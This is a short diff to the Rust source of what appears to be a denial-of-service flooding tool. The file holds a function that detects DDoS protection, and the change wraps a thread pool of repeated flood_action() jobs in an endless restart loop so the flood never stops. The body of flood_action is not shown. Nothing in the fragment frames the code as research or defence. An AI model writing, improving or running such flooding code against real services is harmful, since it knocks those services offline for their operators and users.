@@ -85,15 +85,14 @@ fn detect_ddos_protection(probe: &isahc::Response<isahc::Body>) -> bool {
     return false;
 }
 fn main() {
-
-    let pool = ThreadPool::new(settings::MAX_WORKERS);
-    for _ in 1..settings::MAX_JOBS {
-        pool.execute(|| {
-            flood_action();
-        })
+    loop {
+        println!("RESTART POOL");
+        let pool = ThreadPool::new(settings::MAX_WORKERS);
+        for _ in 1..settings::MAX_JOBS {
+            pool.execute(|| {
+                flood_action();
+            })
+        }
+        pool.join();
     }
-    pool.join();
-    // loop {
-    //     flood_action();
-    // }
 }
